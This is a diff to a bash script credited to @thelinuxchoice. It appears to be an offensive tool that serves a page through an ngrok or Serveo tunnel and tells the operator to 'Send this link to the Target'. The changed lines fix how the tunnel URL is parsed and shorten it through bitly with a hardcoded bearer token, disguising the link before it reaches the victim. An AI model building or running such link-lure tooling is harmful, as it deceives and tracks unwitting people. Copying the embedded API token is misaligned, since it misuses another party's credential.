@@ -342,19 +342,21 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 sleep 5
 
 #link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | ./jq -r '.tunnels[0].public_url' > link.txt)
-send_link=$(cat link.txt)
+#link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | ./jq -r '.tunnels[0].public_url' > link.txt)
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels > link.txt)
+
+send_link=$(cat link.txt | cut -d',' -f3 | cut -d '"' -f4)
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $send_link
 #send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$link)
 
-bitly=$(curl -s --location --request POST 'https://api-ssl.bitly.com/v4/shorten' --header 'Authorization: Bearer 4829231012ed0febfc5a1cb741df0f2e934abe40' --header 'Content-Type: application/json' --data-raw '{"long_url": "'$send_link'"}' | ./jq-linux64 -r '.id')
+bitly=$(curl -s --location --request POST 'https://api-ssl.bitly.com/v4/shorten' --header 'Authorization: Bearer 4829231012ed0febfc5a1cb741df0f2e934abe40' --header 'Content-Type: application/json' --data-raw '{"long_url": "'$send_link'"}' | ./jq -r '.id')
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using bitly:\e[0m\e[1;77m %s \n' $bitly
 printf "\n"
 checkfound
 }
 
 start1() {
-printf "\n"7
+printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunelling, Best!)\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 default_option_server="1"
@@ -404,7 +406,7 @@ printf "\e[1;77m | |_____| |_| |( (___ / ___ |  | |_| |_| || |     \e[0m\n"
 printf "\e[1;77m |_______)\___/  \____)\_____|   \__)\___/ |_|    v1.2 \e[0m\n"
 printf "\n"
 printf "\e[1;93m :::\e[0m\e[1;77m Coded by: @thelinuxchoice\e[0m\n"
-printf "\e[1;93m :::\e[0m\e[1;77m Modified by: @anonime\e[0m\n"
+printf "\e[1;93m :::\e[0m\e[1;77m Modified by: @itdaglog\e[0m\n"
 }
 banner
 dependencies
